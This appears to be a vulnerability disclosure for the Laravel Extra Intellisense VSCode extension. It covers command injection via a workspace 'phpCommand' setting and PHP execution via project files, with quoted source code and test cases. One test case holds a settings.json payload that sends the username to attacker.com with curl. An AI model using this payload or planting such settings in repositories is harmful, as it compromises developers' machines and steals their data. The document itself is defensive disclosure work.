# Laravel Extra Intellisense Extension Vulnerabilities

## Vulnerability 1: Command Injection via Workspace Settings

### Description
The Laravel Extra Intellisense extension allows users to configure the PHP command that executes code to interact with Laravel applications via the `LaravelExtraIntellisense.phpCommand` setting. This setting can be exploited by a malicious repository to execute arbitrary system commands when a victim opens the project in VSCode with this extension installed.

When a victim opens a malicious repository in VSCode, the extension will use the workspace-defined `phpCommand` setting to execute PHP code. An attacker can craft this setting to include shell command injection payloads that will be executed on the victim's machine.

### Impact
Critical - The attacker can execute arbitrary system commands with the privileges of the VSCode user. This can lead to:
- Data exfiltration
- Installation of malware or backdoors
- Lateral movement within networks
- Complete compromise of the victim's machine

### Vulnerability Rank
Critical

### Currently Implemented Mitigations
- Some basic escaping of quotes in the PHP code string
- A security note in the README advising users about the extension running Laravel application automatically

### Missing Mitigations
- No validation or sanitization of the `phpCommand` configuration value
- No warning when a workspace contains a custom `phpCommand` configuration
- No sandboxing or restriction of the executed commands
- No option to disable auto-execution of commands when opening a new workspace

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a malicious repository in VSCode
3. Extension must be enabled for the workspace

### Source Code Analysis
The vulnerability originates in the `helpers.ts` file, specifically in the `runPhp` method:

```typescript
static async runPhp(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/\"/g, "\\\"");
    if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
        code = code.replace(/\$/g, "\\$");
        code = code.replace(/\\\\'/g, '\\\\\\\\\'');
        code = code.replace(/\\\\"/g, '\\\\\\\\\"');
    }
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    let command = commandTemplate.replace("{code}", code);
    
    // This is where the command is executed
    cp.exec(command, 
        { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
        function (err, stdout, stderr) { ... }
    );
}
```

The issue is that `commandTemplate` is read from the workspace configuration without validation. When the extension is activated in `extension.ts`, it immediately attempts to load data from the Laravel project by executing various PHP commands through the `runLaravel` method, which ultimately calls `runPhp`.

All provider classes (RouteProvider, ViewProvider, etc.) call `Helpers.runLaravel()` during their initialization, which triggers the vulnerability as soon as the extension is activated.

### Security Test Case

1. Create a malicious Laravel repository with the following structure:
   ```
   /malicious-laravel-project
     ├── artisan                   # Empty file to trick the extension
     ├── bootstrap
     │   └── app.php               # Empty file to trick the extension
     ├── vendor
     │   └── autoload.php          # Empty file to trick the extension
     └── .vscode
         └── settings.json         # Contains the malicious configuration
   ```

2. In the `.vscode/settings.json` file, add the following configuration:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"echo 'Benign output';\" & curl -s http://attacker.com/steal?data=$(whoami) #"
   }
   ```

3. Share the repository with the victim (e.g., via GitHub, direct download)

4. When the victim opens the project in VSCode with Laravel Extra Intellisense installed:
   - The extension activates and checks if it's a Laravel project
   - It finds the artisan, bootstrap/app.php, and vendor/autoload.php files
   - It reads the custom phpCommand from settings.json
   - It executes the command, which:
     - Runs the benign PHP code to avoid raising suspicion
     - Executes the curl command to send the username to the attacker's server
     - Comments out the rest of the intended PHP code with #

5. Verify that the attacker's server receives the data with the victim's username

This test confirms that the vulnerability can be exploited to execute arbitrary commands and exfiltrate data from the victim's machine.

## Vulnerability 2: Code Injection via PHP Execution

### Description
The Laravel Extra Intellisense extension directly executes PHP code in the context of the Laravel application it's analyzing. If a malicious repository can manipulate certain PHP files that are loaded by the extension, an attacker could achieve PHP code execution on the victim's machine.

### Impact
High - The attacker can execute arbitrary PHP code on the victim's machine, which can lead to:
- Data theft
- File system access
- Network access from the victim's machine
- Potential escalation to full command execution

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Security note in README warning that the extension runs the Laravel application

### Missing Mitigations
- No sandboxing of the PHP execution environment
- No validation of the Laravel project before executing its code
- No option to approve execution when opening untrusted projects

### Preconditions
1. Victim must have the Laravel Extra Intellisense extension installed
2. Victim must open a malicious repository in VSCode
3. PHP must be installed on the victim's machine

### Source Code Analysis
In `helpers.ts`, the `runLaravel` method loads PHP files from the Laravel project:

```typescript
static runLaravel(code: string, description: string|null = null) : Promise<string> {
    code = code.replace(/(?:\r\n|\r|\n)/g, ' ');
    if (fs.existsSync(Helpers.projectPath("vendor/autoload.php")) && fs.existsSync(Helpers.projectPath("bootstrap/app.php"))) {
        var command =
            "define('LARAVEL_START', microtime(true));" +
            "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
            "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
            // ... more PHP code
            // Includes the user's code here
            code +
            // ... more PHP code
        
        return new Promise(function (resolve, error) {
            self.runPhp(command, description)
            // ...
        });
    }
    return new Promise((resolve, error) => resolve(""));
}
```

The vulnerability is that the extension directly `require_once`s PHP files from the project, including `vendor/autoload.php` and `bootstrap/app.php`. If these files contain malicious code, it would be executed when the extension runs.

### Security Test Case

1. Create a malicious Laravel repository with the following structure:
   ```
   /malicious-laravel-project
     ├── artisan                  # Empty file to trick the extension
     ├── bootstrap
     │   └── app.php              # Contains malicious PHP code
     └── vendor
         └── autoload.php         # Contains malicious PHP code
   ```

2. In `vendor/autoload.php`, add malicious code:
   ```php
   <?php
   // Malicious code to create a file with system information
   file_put_contents('/tmp/hacked.txt', 'System compromised: ' . php_uname() . "\n");
   // Return a valid value to make the extension continue
   return [];
   ```

3. In `bootstrap/app.php`, add:
   ```php
   <?php
   // More malicious actions could be performed here
   // Return a valid Laravel application mock to make the extension continue
   return new stdClass();
   ```

4. Share the repository with the victim

5. When the victim opens the project in VSCode:
   - The extension loads and executes vendor/autoload.php and bootstrap/app.php
   - The malicious code is executed, creating the file /tmp/hacked.txt
   - The extension may show errors because the returned values aren't proper Laravel objects, but the malicious code has already run

6. Verify that the file /tmp/hacked.txt has been created on the victim's machine

This test confirms that PHP code execution is possible through the extension's direct loading of project PHP files.